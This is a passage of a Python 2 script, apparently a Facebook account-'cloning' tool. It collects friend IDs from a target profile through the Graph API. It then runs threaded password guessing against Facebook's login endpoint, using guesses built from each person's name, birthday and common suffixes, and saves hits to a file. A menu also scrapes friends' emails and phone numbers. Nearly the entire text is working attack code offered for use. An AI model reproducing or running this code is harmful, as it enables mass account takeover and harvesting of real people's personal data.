			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mRana-Nadeem\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
	print "  \033[1;91m«---•◈•---Developed By Mr-Nadeem--•◈•---»" #Dev:M_Asim
	print '\033[1;95mProcess Has Been Completed Press➡ Type 0 Enter↩ Next Type 0 (logout)↩\033[1;97m....'
        print '\033[1;95mNext Type (python2 NADEEM0003.py) Next login facebook Start Cloning\033[1;97m....'
	print"\033[1;92mTotal Live/\x1b[1;91mError \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
	print """

Don't Worry Your Checkpoint ID Will Be Open After 7 Days 

•\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
: \033[1;94m .....Rana-Nadeem...... \033[1;97m :
•\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                WhatsApp Group
              \033[1;94m """
	
	raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
	crack()
          
def isi():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo17
	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;92mClone Friend List Public ID Jam."
        time.sleep(0.05)
	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m0.\033[1;91mBack"
	pilih_isi()

def pilih_isi():
	peak = raw_input("\n\033[1;95mEnter Number>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;94mFill in correctly"
		pilih_isi()
	elif peak =="1":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;97m[•◈•] \033[1;94mEnter ID\033[1;97m: \033[1;97m")
		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;94mRana-Nadeem\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;97mName\033[1;97m:\033[1;94m "+op["name"]
		except KeyError:
			print"\x1b[1;97mID Not Found!"
			raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
			isi()
		print"\033[1;94mGetting IDs\033[1;97m..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		crack()
	else:
		print "\x1b[1;97mFill in correctly"
		pilih_isi()
	
	print "\033[1;97mTotal IDs\033[1;97m: \033[1;94m"+str(len(id))
	jalan('\033[1;94mPlease Wait\033[1;94m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m«-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
        jalan(' \033[1;95m          Start Cloning Mr Nadeem')
	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:Jam_Shahrukh 
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name']+b['middle_name']+b['last_name']
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass1
					cek = open("out/checkpoint.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = 'Muhammad'+b['last_name']
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass2
							cek = open("out/checkpoint.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['last_name']+'786'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass3
									cek = open("out/checkpoint.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = b['first_name'] + '123456'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass4
											cek = open("out/checkpoint.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = b['first_name'] + 'xxx'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass5
													cek = open("out/checkpoint.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = b['first_name'] + b['last_name']+'786'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass6
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass7 = b['first_name']+b['last_name']+'123'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass7
																	cek = open("out/checkpoint.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mAsim-Pardasi\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
	print "  \033[1;91m«---•◈•---Developed By Mr- Nadeem--•◈•---»" #Dev:Jam_Shahrukh
	print '\033[1;95mProcess Has Been Completed Press➡ Type 0 Enter↩ Next Type 0 (logout)↩\033[1;97m....'
        print '\033[1;95mNext Type (python2 NADEEM0003.py) Next login facebook Start Cloning\033[1;97m....'
	print"\033[1;92mTotal Live/\x1b[1;91mError \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
	print """
Don't Worry Your Checkpoint ID Will Be Open After 7 Days 

•\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
: \033[1;94m .....Rana-Nadeem....... \033[1;97m :
•\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                WhatsApp Group
              \033[1;94m https://chat.whatsapp.com/GWTPaJVAy1gDHIDgHEw0Ht"""
	
	raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
	crack()
          
def army():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo4
	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;92mClone Friend List Public ID Test."
        time.sleep(0.05)
	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m0.\033[1;91mBack"
	pilih_army()

def pilih_army():
	peak = raw_input("\n\033[1;95mEnter Number>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;94mFill in correctly"
		pilih_army()
	elif peak =="1":
		os.system('clear')
		print logo3
		jjj = raw_input("\033[1;97m[•◈•] \033[1;94mEnter ID\033[1;97m: \033[1;97m")
		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;94mRana-Nadeem\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
		try:
			gg = requests.get("https://graph.facebook.com/"+jjj+"?access_token="+toket)
			hh = json.loads(gg.text)
			print"\033[1;97mName\033[1;97m:\033[1;94m "+hh["name"]
		except KeyError:
			print"\x1b[1;97mID Not Found!"
			raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
			army()
		print"\033[1;94mGetting IDs\033[1;97m..."
		d = requests.get("https://graph.facebook.com/"+jjj+"/friends?access_token="+toket)
		e = json.loads(d.text)
		for t in e['data']:
			id.append(t['id'])
	elif peak =="0":
		crack()
	else:
		print "\x1b[1;97mFill in correctly"
		pilih_army()
	
	print "\033[1;97mTotal IDs\033[1;97m: \033[1;94m"+str(len(id))
	jalan('\033[1;94mPlease Wait\033[1;94m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m«-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
        jalan(' \033[1;95m          Start Cloning Testing ')
	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
	def main(arg):
		user = arg
		try:
			w = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
			q = json.loads(w.text)
			# Password Guess 1
			pass1 = q['first_name'] + '123'
			data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
			u = json.load(data)
			if 'access_token' in u:
			    print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass1
                        elif 'www.facebook.com' in u['error_msg']:
                            print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass1
                        else:
            	            # Password Guess 2
                            pass2 = q['first_name'] + '12345'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            u = json.load(data)
                            if 'access_token' in u:
                                print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass2
                            elif 'www.facebook.com' in u['error_msg']:
                                print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass2
                            else:
                	        # Password Guess 3
                                pass3 = q['last_name'] + '123'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                u = json.load(data)
                                if 'access_token' in u:
                                    print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass3
                                elif 'www.facebook.com' in u['error_msg']:
                                    print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass3
                                else:
                    	            # Password Guess 4
                                    birth = q['birthday']
                                    pass4 = birth.replace('/', '')
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    u = json.load(data)
                                    if 'access_token' in u:
                                        print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass4
                                    elif 'www.facebook.com' in u['error_msg']:
                                        print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass4
                                    else:
                                        # Password Guess 5
                                        pass5 = '786786'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        u = json.load(data)
                                        if 'access_token' in u:
                            	            print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass5
                                        elif 'www.facebook.com' in u['error_msg']:
                            	            print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass5
                                        else:
                            	            # Password Guess 6
                            	            pass6 = 'Pakistan1'
                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                            u = json.load(data)
                                            if 'access_token' in u:
                                	        print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass6
                                            elif 'www.facebook.com' in u['error_msg']:
                            	                print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass6
                                            else:
                            	                # Password Guess 7
                            	                pass7 = b['first_name'] + '1234'
                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                u = json.load(data)
                                                if 'access_token' in u:
                                	            print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass7
                                                elif 'www.facebook.com' in u['error_msg']:
                            	                    print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass7
                                                else:
                            	                    # Password Guess 8
                            	                    pass8 = q['first_name'] + '786'
                                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                    u = json.load(data)
                                                    if 'access_token' in u:
                                	                print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass8
                                                    elif 'www.facebook.com' in u['error_msg']:
                            	                        print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass8
                                                    else:
                            	                        # Password Guess 9
                            	                        pass9 = q['first_name'] + 'Khan'
                                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                        u = json.load(data)
                                                        if 'access_token' in u:
                                	                    print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass9
                                                        elif 'www.facebook.com' in u['error_msg']:
                            	                            print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass9
                                                        else:
                            	                            # Password Guess 10
                            	                            pass10 = q['first_name'] + q['last_name']
                                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass10 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                            u = json.load(data)
                                                            if 'access_token' in u:
                                	                        print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass10
                                                            elif 'www.facebook.com' in u['error_msg']:
                            	                                print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass10
                                                            else:
                            	                                # Password Guess 11
                            	                                pass11 = '786000'
                                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass11 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                u = json.load(data)
                                                                if 'access_token' in u:
                                	                            print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass11
                                                                elif 'www.facebook.com' in u['error_msg']:
                            	                                    print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass11
                                                                else:
                            	                                    # Password Guess 12
                            	                                    pass12 = 'Pakistan'
                                                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass12 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                    u = json.load(data)
                                                                    if 'access_token' in u:
                                	                                print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass12
                                                                    elif 'www.facebook.com' in u['error_msg']:
                            	                                        print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass12
                                                                    else:
                            	                                        # Password Guess 13
                            	                                        pass13 = '000786'
                                                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass13 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                        u = json.load(data)
                                                                        if 'access_token' in u:
                                	                                    print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass13
                                                                        elif 'www.facebook.com' in u['error_msg']:
                            	                                            print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass13
                                                                        else:
                            	                                            # Password Guess 14
                            	                                            pass14 = q['first_name'] + q['last_name'] + '786'
                                                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass14 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                            u = json.load(data)
                                                                            if 'access_token' in u:
                                	                                        print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass14
                                                                            elif 'www.facebook.com' in u['error_msg']:
                            	                                                print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass14
                                                                            else:
                                                                                 pass
                            		
                except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mAsim-Extra\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
	print "  \033[1;91m«---•◈•---Developed By Rana-Nadeem--•◈•---»" #Dev:M_Asim
	print '\033[1;95mProcess Has Been Completed Press➡ Type 0 Enter↩ Next Type 0 (logout)↩\033[1;97m....'
        print '\033[1;95mNext Type (python2 NADEEM0003.py) Next login facebook Start Cloning\033[1;97m....'
	print"\033[1;92mTotal Live/\x1b[1;91mError \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
	print """
Don't Worry Your Checkpoint ID Will Be Open After 7 Days 

•\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
: \033[1;94m .....Rana-Nadeem....... \033[1;97m :
•\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                WhatsApp Group
              \033[1;94m https://chat.whatsapp.com/GWTPaJVAy1gDHIDgHEw0Ht"""
	
	raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
	crack()
	
def asif():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo24
	print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m1 .\x1b[1;91m Get      ID From Friends      "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m2 .\033[1;91m Friends  ID From Friends      "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m3 .\033[1;91m Get      ID From GRUP         "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m4 .\033[1;91m Get      Friends Email        "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m5 .\033[1;91m Friends  Email   From  Friends"
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m6 .\033[1;91m Get      Phone   From  Friends"
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m7 .\033[1;91m Friend's Phone   From  Friends"
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m8 .\033[1;91m Get All  Information   From  Friends"
        time.sleep(0.05)
	print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m0 .\033[1;92m Back                          "
	pilih_asif()

def pilih_asif():
	peak = raw_input("\n\033[1;91mEnter  Number>>> \033[1;95m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_asif()
	elif peak =="1":
		id_friends()
        elif peak =="2":
	        idfrom_friends()
        elif peak =="3":
                id_member_grup()
        elif peak =="4":
	        email()
        elif peak =="5":
	        emailfrom_friends()
        elif peak =="6":
	        nomor_hp()
        elif peak =="7":
	        hpfrom_friends()
        elif peak =="8":
                informasi()
	elif peak =="0":
		menu()

def id_friends():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')

        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo11
            print 52 * '\x1b[1;95m\xe2\x95\x90'
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            save_id = raw_input('\x1b[1;91m[+] \x1b[1;92mSave File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            bz = open(save_id, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            for ah in z['data']:
                idfriends.append(ah['id'])
                bz.write(ah['id'] + '\n')
                print '\r\x1b[1;96mName\x1b[1;91m  :\x1b[1;97m ' + ah['name']
                print '\x1b[1;91mID   \x1b[1;91m : \x1b[1;97m' + ah['id']
                print 52 * '\x1b[1;97m\xe2\x95\x90'

            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal ID \x1b[1;96m%s' % len(idfriends)
            print '\x1b[1;91m[+] \x1b[1;97mFile Save \x1b[1;91m: \x1b[1;97m' + save_id
            bz.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            asif()
        except IOError:
            print '\x1b[1;91m[!] Error when creating file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            asif()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu()
        except KeyError:
            os.remove(save_id)
            print '\x1b[1;91m[!] An error occurred'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            asif()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
